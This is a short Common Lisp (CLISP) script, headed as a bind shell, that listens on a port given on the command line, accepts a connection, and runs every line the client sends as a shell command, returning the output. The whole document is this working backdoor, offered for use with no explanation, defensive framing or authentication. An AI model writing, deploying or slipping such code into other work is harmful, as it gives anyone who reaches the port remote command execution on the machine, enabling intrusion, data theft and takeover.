;bindshell in clisp
;m0nad /at/ email.com
#!/usr/bin/clisp

(defun stream->string (stream)
  (with-output-to-string (s)
    (loop for line = (read-line stream nil nil)
      while line do (write-line line s))))

(setf socket (socket-server (parse-integer (first ext:*args*))))
(setf stream (socket-accept socket))
(loop
  (and (setf *string* (read-line stream))
  (setf *saida* (stream->string (run-shell-command *string* :output :stream))) 
  (princ *saida* stream)))
